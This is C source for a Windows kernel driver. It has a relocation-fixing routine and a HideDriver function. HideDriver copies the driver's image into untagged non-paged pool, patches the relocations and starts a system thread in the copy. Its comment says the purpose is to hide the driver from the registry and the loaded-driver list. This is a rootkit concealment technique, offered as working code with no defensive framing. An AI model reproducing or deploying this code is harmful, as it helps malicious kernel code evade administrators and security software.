VOID ProcessReloc(ULONG ModuleBase,ULONG ModuleSize, PIMAGE_NT_HEADERS pNtHeaders, ULONG SpaceDelta)
{
    PIMAGE_BASE_RELOCATION  pRelocTable;
    ULONG                   RelocTableSize;
    PIMAGE_BASE_RELOCATION  pReloc;
    PUSHORT                 RelocsTbl;
    ULONG                   i;
    ULONG                   TableAddr;

    pRelocTable    = (PVOID)(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + (ULONG)ModuleBase);
    RelocTableSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    for (pReloc = pRelocTable; (ULONG)pReloc < ((ULONG)pRelocTable + RelocTableSize); pReloc = (PVOID)((ULONG)pReloc + pReloc->SizeOfBlock)){
        RelocsTbl = (PUSHORT)((ULONG)pReloc + 0x8);
        for (i = 0; i < ((pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2); i++)
        {
            TableAddr = pReloc->VirtualAddress + (RelocsTbl[i] & 0x0fff) + ModuleBase;
			if ((TableAddr < ModuleBase) || (TableAddr >= ModuleBase + ModuleSize)){
				continue;
			}
			if ((RelocsTbl[i] & 0xF000) == 0x3000){
				*(PULONG)TableAddr += SpaceDelta;
			}
        }
    }
}

NTSTATUS HideDriver(PDRIVER_OBJECT pDriverObject,ULONG dwHidedDriverEntry){
	// функци€ пр€чет драйвер с реестра/списка загруженных драйверов и тд.
	NTSTATUS	nStat = STATUS_DEVICE_CONFIGURATION_ERROR;
	ULONG		nSize,pNewEntry,dwDelta;
	PVOID		pNewPlace = NULL; 
	HANDLE		hThread;
	PIMAGE_DOS_HEADER		pImageDosHeader = NULL;
	PIMAGE_OPTIONAL_HEADER	pImageOptionalHeader = NULL;
	PIMAGE_NT_HEADERS		pImageNtHeaders = NULL;
	PIMAGE_FILE_HEADER		pImageFileHeader = NULL;
	
	nSize = pNewEntry = dwDelta = 0;
	
	if (MmIsAddressValid((PVOID)pDriverObject)){
		nSize = pDriverObject->DriverSize;
		if (nSize){
			pNewPlace = ExAllocatePoolWithTag(NonPagedPool,nSize,0x00000000);
			if (pNewPlace){
				__try {
					RtlCopyMemory(pNewPlace,pDriverObject->DriverStart,nSize);
					pNewEntry = dwHidedDriverEntry+(ULONG)pNewPlace;
					pImageDosHeader = (PIMAGE_DOS_HEADER)pNewPlace;
					pImageNtHeaders	= (PIMAGE_NT_HEADERS)NTSIGNATURE(pImageDosHeader);
					dwDelta = (ULONG)pNewPlace-(ULONG)pDriverObject->DriverStart;
					if (dwDelta){
						ProcessReloc((ULONG)pNewPlace,nSize,pImageNtHeaders,dwDelta);
					}
					nStat = PsCreateSystemThread(&hThread,THREAD_ALL_ACCESS, NULL, NULL, NULL, (PKSTART_ROUTINE)pNewEntry, (ULONG_PTR)0);
				}	__except(EXCEPTION_EXECUTE_HANDLER){
					Dbg("HideDriver exception !\n");
				}
			}
		}
	}	
	return nStat;
}


